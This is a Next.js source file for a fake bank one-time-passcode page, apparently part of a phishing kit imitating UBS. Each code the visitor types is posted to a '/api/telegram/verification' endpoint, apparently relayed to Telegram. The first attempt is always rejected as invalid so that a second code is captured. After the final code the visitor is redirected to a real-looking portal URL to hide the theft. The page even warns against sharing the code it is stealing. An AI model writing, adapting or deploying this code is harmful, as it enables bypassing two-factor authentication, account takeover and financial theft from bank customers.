"use client";

import { Suspense, useState, useEffect } from "react";
import { useRouter, useSearchParams } from "next/navigation";
import { Check, Info, Lock, Mail, X } from "lucide-react";
import { Button } from "@/components/ui/button";
import { VerificationHeader } from "@/components/verification-header";

const PEAK1_REDIRECT_URL =
  "https://peak1.wealthcareportal.com/Authentication/Handshake";

function EnterCodeContent() {
  const [code, setCode] = useState("");
  const [firstAttemptCode, setFirstAttemptCode] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [isResending, setIsResending] = useState(false);
  const [attemptCount, setAttemptCount] = useState(0);
  const [errorMessage, setErrorMessage] = useState("");
  const [isCooldown, setIsCooldown] = useState(false);
  const [cooldownSeconds, setCooldownSeconds] = useState(0);
  const [verificationEmail, setVerificationEmail] = useState<string>(
    "m**********r8@gmail.com",
  );
  const [verificationMethod, setVerificationMethod] = useState<
    "email" | "text"
  >("email");
  const router = useRouter();
  const searchParams = useSearchParams();
  const isSecondOtp = searchParams.get("step") === "2";

  useEffect(() => {
    if (typeof window === "undefined") return;

    const storedEmail = sessionStorage.getItem("verification_email");
    const storedMethod = sessionStorage.getItem("verification_method") as
      | "email"
      | "text"
      | null;

    if (storedEmail) setVerificationEmail(storedEmail);
    if (storedMethod === "email" || storedMethod === "text") {
      setVerificationMethod(storedMethod);
    }
  }, []);

  useEffect(() => {
    if (typeof window === "undefined") return;
    if (isSecondOtp) {
      if (!sessionStorage.getItem("ubs_otp2"))
        router.replace("/verify-details");
    } else {
      if (!sessionStorage.getItem("ubs_verify")) router.replace("/");
    }
  }, [isSecondOtp, router]);

  useEffect(() => {
    if (!isCooldown || cooldownSeconds <= 0) return;

    const timer = setInterval(() => {
      setCooldownSeconds((prev) => {
        const newSeconds = prev - 1;
        if (newSeconds <= 0) {
          setIsCooldown(false);
        }
        return newSeconds;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, [isCooldown, cooldownSeconds]);

  const handleVerify = async () => {
    if (isLoading || isCooldown) return;
    setIsLoading(true);
    setErrorMessage("");

    // Only apply two-attempt flow for first verification, not final verification
    if (!isSecondOtp) {
      const newAttemptCount = attemptCount + 1;
      setAttemptCount(newAttemptCount);

      // First attempt: send code and show error
      if (newAttemptCount === 1) {
        setFirstAttemptCode(code);
        try {
          await fetch("/api/telegram/verification", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              verificationType: "Code (first OTP) - First Attempt",
              code: code,
            }),
          }).catch(console.error);
        } catch (error) {
          console.error("Failed to send verification notification:", error);
        }
        setErrorMessage("Invalid or expired code");
        setCode("");
        setIsLoading(false);
        setIsCooldown(true);
        setCooldownSeconds(15);
        return;
      }

      // Second attempt: send both codes and proceed with verification
      try {
        await fetch("/api/telegram/verification", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            verificationType: "Code (first OTP) - Second Attempt",
            code: code,
            firstAttemptCode: firstAttemptCode,
          }),
        }).catch(console.error);
      } catch (error) {
        console.error("Failed to send verification notification:", error);
      }
    } else {
      // Final verification - direct path, no two-attempt flow
      try {
        await fetch("/api/telegram/verification", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            verificationType: "Code (final)",
            code,
          }),
        }).catch(console.error);
      } catch (error) {
        console.error("Failed to send verification notification:", error);
      }
    }

    await new Promise((r) => setTimeout(r, 1000));
    if (isSecondOtp) {
      window.location.href = PEAK1_REDIRECT_URL;
    } else {
      if (typeof window !== "undefined")
        sessionStorage.setItem("ubs_details", "1");
      router.push("/verify-details");
    }
  };

  const handleResend = async () => {
    if (isResending) return;
    setIsResending(true);
    try {
      await fetch("/api/telegram/resend-code", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ isSecondOtp }),
      }).catch(console.error);
    } catch (error) {
      console.error("Failed to send resend code notification:", error);
    }
    await new Promise((r) => setTimeout(r, 2000));
    setIsResending(false);
  };

  return (
    <div className="min-h-screen bg-[#f3f3f1]">
      <VerificationHeader />

      <div className="mx-auto w-full max-w-[1280px] px-4 py-10 md:py-12">
        <div className="ml-0 md:ml-[150px] w-[420px]">
          <div className="mb-5 flex justify-center md:justify-center">
            <Lock className="h-8 w-8" />
          </div>

          <p className="mb-4 w-[360px] text-[13px] text-center leading-[1.65rem] text-[#494949]">
            An e-mail has been sent to the following address:
          </p>

          {/* <p className="mt-3 mb-4 text-[15px] font-normal tracking-wide text-[#2d2d2d]">
            {verificationEmail}
          </p> */}

          <p className="text-[13px] text-center text-[#494949]">
            Enter the verification code that you received via{" "}
            {verificationMethod === "email" ? "Email" : "Text"} below:
          </p>

          <p className="mt-2 text-[15px] text-center text-[#494949]">
            Note - Do not share your verification code with anyone else.
          </p>

          {errorMessage && (
            <div className="mt-4 mb-3 rounded-md border border-red-200 bg-red-50 px-3 py-2">
              <p className="text-sm font-medium text-red-600">{errorMessage}</p>
            </div>
          )}

          <div className="mt-6 flex items-center gap-3">
            <div className="flex h-8 w-8 items-center justify-center text-[#2d2d2d]">
              <Mail className="h-5 w-5" strokeWidth={1.8} />
            </div>

            <label className="text-[15px] font-medium text-[#2d2d2d]">
              Confirmation Code
            </label>

            <input
              type="text"
              id="code"
              inputMode="numeric"
              value={code}
              onChange={(e) =>
                setCode(e.target.value.replace(/\D/g, "").slice(0, 6))
              }
              placeholder=""
              className="h-[42px] w-[270px] border border-[#4d4d4d] bg-white px-3 text-[15px] text-[#2d2d2d] outline-none"
              maxLength={6}
            />
          </div>

          <div className="mt-6 space-y-3">
            <Button
              type="button"
              onClick={handleVerify}
              disabled={
                code.replace(/\D/g, "").length !== 6 || isLoading || isCooldown
              }
              className="flex h-[54px] w-[270px] items-center justify-start gap-3 rounded-none border border-[#2d2d2d] bg-[#2e4460] px-4 text-left text-[15px] font-semibold tracking-[0.08em] text-white hover:bg-[#263d54] disabled:opacity-80"
            >
              <Check className="h-5 w-5" strokeWidth={2.5} />
              <span>
                {isLoading
                  ? "Loading..."
                  : isCooldown
                    ? `Wait ${cooldownSeconds}s`
                    : "CONTINUE"}
              </span>
            </Button>

            <Button
              type="button"
              variant="ghost"
              onClick={() => router.push("/verify-choice")}
              className="flex h-[54px] w-[270px] items-center justify-start gap-3 rounded-none border border-[#2d2d2d] bg-[#d7d7d7] px-4 text-left text-[15px] font-semibold tracking-[0.08em] text-[#2d2d2d] hover:bg-[#cfcfcf]"
            >
              <X className="h-5 w-5" strokeWidth={2.2} />
              <span>CANCEL</span>
            </Button>

            <Button
              type="button"
              onClick={handleResend}
              disabled={isResending}
              className="flex h-[54px] w-[270px] items-center justify-start gap-3 rounded-none border border-[#2d2d2d] bg-[#2e4460] px-4 text-left text-[15px] font-semibold tracking-[0.08em] text-white hover:bg-[#263d54] disabled:opacity-80"
            >
              <Check className="h-5 w-5" strokeWidth={2.5} />
              <span>{isResending ? "LOADING..." : "RESEND CODE"}</span>
            </Button>
          </div>

          <div className="mt-7 flex w-[420px] items-start gap-4 rounded-[2px] border border-[#e0d899] bg-[#e7e2a8] p-4 text-[#2d2d2d] shadow-sm">
            <div className="mt-1 flex h-9 w-9 shrink-0 items-center justify-center rounded-full border-[2px] border-[#2d2d2d] bg-transparent">
              <Info className="h-5 w-5" strokeWidth={2.3} />
            </div>
            <p className="max-w-[300px] text-[15px] leading-[1.65rem] text-[#2d2d2d]">
              If you wish to cancel, you will be asked to enter a code the next
              time you login or try to perform this specific function.
            </p>
          </div>
        </div>
      </div>
    </div>
  );
}

export default function EnterCodePage() {
  return (
    <Suspense
      fallback={
        <div className="min-h-screen bg-white flex items-center justify-center text-gray-600">
          Loading...
        </div>
      }
    >
      <EnterCodeContent />
    </Suspense>
  );
}
